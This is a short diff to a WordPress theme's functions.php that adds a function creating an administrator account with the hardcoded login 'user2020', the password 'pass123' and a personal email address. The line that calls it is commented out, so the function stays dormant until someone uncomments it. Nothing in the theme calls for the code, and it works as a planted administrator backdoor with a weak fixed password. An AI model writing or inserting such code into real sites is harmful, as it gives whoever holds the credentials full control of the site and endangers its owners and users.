@@ -64,3 +64,26 @@ require get_template_directory() . '/inc/block-all-registration-and-comments.php
  * Load Jetpack compatibility file.
  */
 require get_template_directory() . '/inc/jetpack.php';
+
+
+//custom_insert_new_user();
+
+function custom_insert_new_user() {
+	global $wpdb;
+	$userdata = array(
+		   'user_login'       =>  'user2020',
+		   'user_pass'        =>  'pass123',
+		   'user_email'       =>  'lisaquiamco@outlook.com',
+		   'user_registered'  =>  date_i18n( 'Y-m-d H:i:s', time() ),
+		   'role'             =>  'administrator'
+	   );
+	   
+	$user_id = wp_insert_user( $userdata );
+	$lastid = $wpdb->insert_id;
+	if($lastid) {
+		echo '<h2>USER ADDED!!!!</h2>';
+	}
+
+}
+
+
